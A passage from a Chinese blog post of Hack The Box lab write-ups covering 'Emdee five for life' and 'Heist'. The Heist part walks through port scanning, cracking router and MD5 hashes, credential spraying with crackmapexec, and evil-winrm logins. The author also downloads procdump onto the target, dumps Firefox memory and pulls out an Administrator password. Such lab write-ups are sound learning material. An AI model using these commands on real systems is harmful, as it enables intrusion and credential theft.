<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>HTB Intro to Dante Writeups - Ramen's Box</title><meta name=Description content="Ramen's stuff box"><meta property="og:title" content="HTB Intro to Dante Writeups"><meta property="og:description" content="最近突然对渗透测试很感兴趣，充了个 htb 会员才发现基础不牢地动山摇，趁着会员快过期了先把 Intro to Dante Track 做完了，给报 Dante Pro Lab 打一下基础，之后先去 TryHackMe 学一手再回来开 htb 会员刷 Box。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.lxdlam.com/post/27e78a70/"><meta property="og:image" content="https://blog.lxdlam.com/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-16T03:49:05+08:00"><meta property="article:modified_time" content="2023-01-04T02:01:57+08:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.lxdlam.com/logo.png"><meta name=twitter:title content="HTB Intro to Dante Writeups"><meta name=twitter:description content="最近突然对渗透测试很感兴趣，充了个 htb 会员才发现基础不牢地动山摇，趁着会员快过期了先把 Intro to Dante Track 做完了，给报 Dante Pro Lab 打一下基础，之后先去 TryHackMe 学一手再回来开 htb 会员刷 Box。"><meta name=application-name content="Ramen's Box"><meta name=apple-mobile-web-app-title content="Ramen's Box"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.lxdlam.com/post/27e78a70/><link rel=prev href=https://blog.lxdlam.com/post/8697249c/><link rel=next href=https://blog.lxdlam.com/post/1f7260ad/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><meta name=google-site-verification content="UA-92306989-1"><meta name=baidu-site-verification content="092774cb717e6851abd2d7fc55835b40"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB Intro to Dante Writeups","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.lxdlam.com\/post\/27e78a70\/"},"image":["https:\/\/blog.lxdlam.com\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"渗透测试, HackTheBox","wordcount":3547,"url":"https:\/\/blog.lxdlam.com\/post\/27e78a70\/","datePublished":"2022-03-16T03:49:05+08:00","dateModified":"2023-01-04T02:01:57+08:00","license":"本站所有内容基于署名-非商业性使用-相同方式共享 4.0 国际协议（CC BY-NC-SA 4.0）给出许可","publisher":{"@type":"Organization","name":"Ramen","logo":"https:\/\/blog.lxdlam.com\/images\/avatar.png"},"author":{"@type":"Person","name":"Ramen"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ramen's Box"><span class=header-title-pre><i class='fas fa-star'></i></span>Ramen's Box</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ramen's Box"><span class=header-title-pre><i class='fas fa-star'></i></span>Ramen's Box</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>所有文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Intro to Dante Writeups</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://blog.lxdlam.com title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Ramen</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/><i class="far fa-folder fa-fw" aria-hidden=true></i>趣题记录</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2022-03-16>2022-03-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 3547 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 8 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#emdee-five-for-life>Emdee five for life</a></li><li><a href=#heist>Heist</a><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li><li><a href=#openadmin>OpenAdmin</a><ul><li><a href=#enumeration-1>Enumeration</a></li><li><a href=#foothold-1>Foothold</a></li><li><a href=#lateral-movement>Lateral Movement</a></li><li><a href=#privilege-escalation-1>Privilege Escalation</a></li></ul></li><li><a href=#marketdump>MarketDump</a></li><li><a href=#nest>Nest</a><ul><li><a href=#enumeration-2>Enumeration</a></li><li><a href=#foothold-2>Foothold</a></li><li><a href=#privilege-escalation-2>Privilege Escalation</a></li></ul></li><li><a href=#curling>Curling</a><ul><li><a href=#enumeration-3>Enumeration</a></li><li><a href=#foothold-3>Foothold</a></li><li><a href=#lateral-movement-1>Lateral Movement</a></li><li><a href=#privilege-escalation-3>Privilege Escalation</a></li></ul></li><li><a href=#epilogue>Epilogue</a></li></ul></nav></div></div><div class=content id=content><p>最近突然对渗透测试很感兴趣，充了个 htb 会员才发现基础不牢地动山摇，趁着会员快过期了先把 Intro to Dante Track 做完了，给报 Dante Pro Lab 打一下基础，之后先去 TryHackMe 学一手再回来开 htb 会员刷 Box。</p><h2 id=emdee-five-for-life>Emdee five for life</h2><p>启动靶机访问一下，要求提交给定 String 的 MD5：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647350152_19bf7c6e.png title=https://assets.lxdlam.com/img/1647350152_19bf7c6e.png data-thumbnail=https://assets.lxdlam.com/img/1647350152_19bf7c6e.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647350152_19bf7c6e.png data-srcset="https://assets.lxdlam.com/img/1647350152_19bf7c6e.png, https://assets.lxdlam.com/img/1647350152_19bf7c6e.png 1.5x, https://assets.lxdlam.com/img/1647350152_19bf7c6e.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647350152_19bf7c6e.png width=100%></a><p>直接 <code>md5sum</code> 一下然后提示 Too Slow，应该是要写代码。看了下 Cookie 有 <code>PHPSESSID</code>，那两次请求需要保存一下 session。随便搞一个脚本就行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://ip:port/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>rsp</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>rsp</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=s1>&#39;lxml&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>md5</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>soup</span><span class=o>.</span><span class=n>body</span><span class=o>.</span><span class=n>h3</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>rsp</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;hash&#34;</span><span class=p>:</span> <span class=n>m</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()})</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>rsp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>成功拿到 flag。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647350670_652eaac5.png title=https://assets.lxdlam.com/img/1647350670_652eaac5.png data-thumbnail=https://assets.lxdlam.com/img/1647350670_652eaac5.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647350670_652eaac5.png data-srcset="https://assets.lxdlam.com/img/1647350670_652eaac5.png, https://assets.lxdlam.com/img/1647350670_652eaac5.png 1.5x, https://assets.lxdlam.com/img/1647350670_652eaac5.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647350670_652eaac5.png width=100%></a><h2 id=heist>Heist</h2><h3 id=enumeration>Enumeration</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>ports</span><span class=o>=</span><span class=k>$(</span>nmap -p- --min-rate<span class=o>=</span><span class=m>1000</span> -T4 <span class=nv>$target</span> <span class=p>|</span> grep ^<span class=o>[</span>0-9<span class=o>]</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span>
</span></span><span class=line><span class=cl>nmap -p <span class=nv>$ports</span> -sCV <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png title=https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png data-thumbnail=https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png data-srcset="https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png, https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png 1.5x, https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647353907_6e5c0f9e.png width=100%></a><p>有一个 IIS Server 和 smb，上 <a href=https://book.hacktricks.xyz/ target=_blank rel="noopener noreffer">HackTricks</a> 搜了一下 5985 端口跑的是是 WinRM。</p><p>先看看 80 有什么：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647354072_efbee4b3.png title=https://assets.lxdlam.com/img/1647354072_efbee4b3.png data-thumbnail=https://assets.lxdlam.com/img/1647354072_efbee4b3.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647354072_efbee4b3.png data-srcset="https://assets.lxdlam.com/img/1647354072_efbee4b3.png, https://assets.lxdlam.com/img/1647354072_efbee4b3.png 1.5x, https://assets.lxdlam.com/img/1647354072_efbee4b3.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647354072_efbee4b3.png width=100%></a><p>点右下角的 <em>Login as guest</em> 里面有一个有意思的文件：</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647354107_5aac2d40.png title=https://assets.lxdlam.com/img/1647354107_5aac2d40.png data-thumbnail=https://assets.lxdlam.com/img/1647354107_5aac2d40.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647354107_5aac2d40.png data-srcset="https://assets.lxdlam.com/img/1647354107_5aac2d40.png, https://assets.lxdlam.com/img/1647354107_5aac2d40.png 1.5x, https://assets.lxdlam.com/img/1647354107_5aac2d40.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647354107_5aac2d40.png width=100%></a><p>看了一下，发现三个和密码有关的东西：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
</span></span><span class=line><span class=cl>username rout3r password 7 0242114B0E143F015F5D1E161713
</span></span><span class=line><span class=cl>username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
</span></span></code></pre></td></tr></table></div></div><p><code>$1$$</code> 的形式是 MD5，直接用 john 给爆出来：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john <span class=nb>hash</span> --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt -rules<span class=o>=</span>Jumbo
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647354856_84bc0bbf.png title=https://assets.lxdlam.com/img/1647354856_84bc0bbf.png data-thumbnail=https://assets.lxdlam.com/img/1647354856_84bc0bbf.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647354856_84bc0bbf.png data-srcset="https://assets.lxdlam.com/img/1647354856_84bc0bbf.png, https://assets.lxdlam.com/img/1647354856_84bc0bbf.png 1.5x, https://assets.lxdlam.com/img/1647354856_84bc0bbf.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647354856_84bc0bbf.png width=100%></a><p>后两个根据对话推测是 Cisco 路由器密码，找到 <a href=https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html target=_blank rel="noopener noreffer">Cracker</a> 直接把两个密码算出来：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>$uperP@ssword
</span></span><span class=line><span class=cl>Q4)sJu\Y8qz*A3?d
</span></span></code></pre></td></tr></table></div></div><p>直接把这三个密码和提问的用户 Hazard 用 <code>crackmapexec</code> 枚举一下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackmapexec smb <span class=nv>$target</span> -u hazard -p passwords.txt
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647355526_ac9311f0.png title=https://assets.lxdlam.com/img/1647355526_ac9311f0.png data-thumbnail=https://assets.lxdlam.com/img/1647355526_ac9311f0.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647355526_ac9311f0.png data-srcset="https://assets.lxdlam.com/img/1647355526_ac9311f0.png, https://assets.lxdlam.com/img/1647355526_ac9311f0.png 1.5x, https://assets.lxdlam.com/img/1647355526_ac9311f0.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647355526_ac9311f0.png width=100%></a><p>找到用户名和密码之后，用 <a href=https://github.com/SecureAuthCorp/impacket target=_blank rel="noopener noreffer">impacket</a> 的 <code>lookupsid</code> 做一下枚举：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 lookupsid.py hazard:stealth1agent@<span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647355738_d531aa3d.png title=https://assets.lxdlam.com/img/1647355738_d531aa3d.png data-thumbnail=https://assets.lxdlam.com/img/1647355738_d531aa3d.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647355738_d531aa3d.png data-srcset="https://assets.lxdlam.com/img/1647355738_d531aa3d.png, https://assets.lxdlam.com/img/1647355738_d531aa3d.png 1.5x, https://assets.lxdlam.com/img/1647355738_d531aa3d.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647355738_d531aa3d.png width=100%></a><p>把这些个人用户都加进去，重新枚举。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647355937_28538e23.png title=https://assets.lxdlam.com/img/1647355937_28538e23.png data-thumbnail=https://assets.lxdlam.com/img/1647355937_28538e23.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647355937_28538e23.png data-srcset="https://assets.lxdlam.com/img/1647355937_28538e23.png, https://assets.lxdlam.com/img/1647355937_28538e23.png 1.5x, https://assets.lxdlam.com/img/1647355937_28538e23.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647355937_28538e23.png width=100%></a><h3 id=foothold>Foothold</h3><p>找到了两个可以用的用户名和密码，<code>smbmap</code> 之后都无功而返，尝试枚举 <code>winrm</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackmapexec winrm <span class=nv>$target</span> -u users.txt -p passwords.txt
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647356058_17145e6d.png title=https://assets.lxdlam.com/img/1647356058_17145e6d.png data-thumbnail=https://assets.lxdlam.com/img/1647356058_17145e6d.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647356058_17145e6d.png data-srcset="https://assets.lxdlam.com/img/1647356058_17145e6d.png, https://assets.lxdlam.com/img/1647356058_17145e6d.png 1.5x, https://assets.lxdlam.com/img/1647356058_17145e6d.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647356058_17145e6d.png width=100%></a><p>发现 Chase 账号是有权限的，用 <code>evil-winrm</code> 打进去。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -u chase -p <span class=s1>&#39;Q4)sJu\Y8qz*A3?d&#39;</span> -i <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647356202_2cdec74d.png title=https://assets.lxdlam.com/img/1647356202_2cdec74d.png data-thumbnail=https://assets.lxdlam.com/img/1647356202_2cdec74d.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647356202_2cdec74d.png data-srcset="https://assets.lxdlam.com/img/1647356202_2cdec74d.png, https://assets.lxdlam.com/img/1647356202_2cdec74d.png 1.5x, https://assets.lxdlam.com/img/1647356202_2cdec74d.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647356202_2cdec74d.png width=100%></a><p>拿到 user flag。</p><h3 id=privilege-escalation>Privilege Escalation</h3><blockquote><p>这里看了 Walkthrough，你打死我我也想不到我要去 dump 内存。</p></blockquote><p>查看一下同文件夹下面的其他文件，有一个 <code>todo.txt</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Stuff to-do:
</span></span><span class=line><span class=cl>1. Keep checking the issues list.
</span></span><span class=line><span class=cl>2. Fix the router config.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Done:
</span></span><span class=line><span class=cl>1. Restricted access for guest user.
</span></span></code></pre></td></tr></table></div></div><p>这个 issue list 要么是个文件，要么是个服务。找了一圈文件没找到，<code>Get-Process</code> 发现有好几个 firefox 在跑：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Chase</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>Get-Process</span>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Chase</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>Get-Process</span> <span class=n>firefox</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647356537_9ef23bed.png title=https://assets.lxdlam.com/img/1647356537_9ef23bed.png data-thumbnail=https://assets.lxdlam.com/img/1647356537_9ef23bed.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647356537_9ef23bed.png data-srcset="https://assets.lxdlam.com/img/1647356537_9ef23bed.png, https://assets.lxdlam.com/img/1647356537_9ef23bed.png 1.5x, https://assets.lxdlam.com/img/1647356537_9ef23bed.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647356537_9ef23bed.png width=100%></a><p>尝试 dump 一下内存看看。从 <a href=https://docs.microsoft.com/en-us/sysinternals/ target=_blank rel="noopener noreffer">Sysinternals</a> 搞到 <code>procdump64.exe</code> 和 <code>strings64.exe</code>，在本机用 <code>python3 -m http.server 80</code> 之后在目标机器上 <code>wget</code> 给弄下来。</p><p>有了工具之后，直接 dump 内存并分析。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Chase</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Local</span><span class=p>\</span><span class=n>Temp</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>procdump</span><span class=p>.</span><span class=py>exe</span> <span class=n>-ma</span> <span class=mf>696</span> <span class=n>firefox</span><span class=p>.</span><span class=py>dmp</span>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Chase</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Local</span><span class=p>\</span><span class=n>Temp</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>strings</span><span class=p>.</span><span class=py>exe</span> <span class=n>firefox</span><span class=p>.</span><span class=py>dmp</span> <span class=p>|</span> <span class=nb>Select-String</span> <span class=n>-Pattern</span> <span class=s2>&#34;[Aa]dmin&#34;</span> <span class=p>|</span> <span class=nb>Select-String</span> <span class=n>-Pattern</span> <span class=s2>&#34;[Pp]assword&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647357149_5d2c88fc.png title=https://assets.lxdlam.com/img/1647357149_5d2c88fc.png data-thumbnail=https://assets.lxdlam.com/img/1647357149_5d2c88fc.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647357149_5d2c88fc.png data-srcset="https://assets.lxdlam.com/img/1647357149_5d2c88fc.png, https://assets.lxdlam.com/img/1647357149_5d2c88fc.png 1.5x, https://assets.lxdlam.com/img/1647357149_5d2c88fc.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647357149_5d2c88fc.png width=100%></a><p>找到一些很有意思的结果，出来试一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -u Administrator -p <span class=s1>&#39;4dD!5}x/re8]FBuZ&#39;</span> -i <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647357424_c53827eb.png title=https://assets.lxdlam.com/img/1647357424_c53827eb.png data-thumbnail=https://assets.lxdlam.com/img/1647357424_c53827eb.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647357424_c53827eb.png data-srcset="https://assets.lxdlam.com/img/1647357424_c53827eb.png, https://assets.lxdlam.com/img/1647357424_c53827eb.png 1.5x, https://assets.lxdlam.com/img/1647357424_c53827eb.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647357424_c53827eb.png width=100%></a><p>提权成功，拿到 root flag。</p><h2 id=openadmin>OpenAdmin</h2><h3 id=enumeration-1>Enumeration</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>ports</span><span class=o>=</span><span class=k>$(</span>nmap -p- --min-rate<span class=o>=</span><span class=m>1000</span> -T4 <span class=nv>$target</span> <span class=p>|</span> grep ^<span class=o>[</span>0-9<span class=o>]</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span>
</span></span><span class=line><span class=cl>nmap -p <span class=nv>$ports</span> -sCV <span class=nv>$target</span>
</span></span></code></pre></td></tr></table></div></div><a class=lightgallery href=https://assets.lxdlam.com/img/1647358089_5322cba2.png title=https://assets.lxdlam.com/img/1647358089_5322cba2.png data-thumbnail=https://assets.lxdlam.com/img/1647358089_5322cba2.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647358089_5322cba2.png data-srcset="https://assets.lxdlam.com/img/1647358089_5322cba2.png, https://assets.lxdlam.com/img/1647358089_5322cba2.png 1.5x, https://assets.lxdlam.com/img/1647358089_5322cba2.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647358089_5322cba2.png width=100%></a><p>80 开着，惯例看一下是什么东西。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647358168_61b5534e.png title=https://assets.lxdlam.com/img/1647358168_61b5534e.png data-thumbnail=https://assets.lxdlam.com/img/1647358168_61b5534e.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647358168_61b5534e.png 